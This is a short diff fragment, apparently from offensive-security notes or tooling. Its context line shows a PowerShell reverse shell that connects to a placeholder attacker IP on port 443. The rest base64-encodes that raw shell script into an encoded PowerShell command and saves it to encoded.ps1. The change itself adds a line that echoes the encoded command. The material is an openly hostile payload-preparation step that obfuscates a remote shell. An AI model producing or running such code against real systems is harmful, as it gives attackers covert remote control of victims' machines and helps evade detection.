@@ -79,6 +79,7 @@ $client = New-Object System.Net.Sockets.TCPClient('<IP_ATTACKER>',443);$stream =
 $expression     = Get-Content -Path .\shell_raw.ps1
 $commandBytes   = [System.Text.Encoding]::Unicode.GetBytes($expression)
 $encodedCommand = [Convert]::ToBase64String($commandBytes)
+echo $encodedCommand
 $filePath = "encoded.ps1"
 
 $encodedCommand | Out-File -FilePath $filePath  -Encoding ASCII
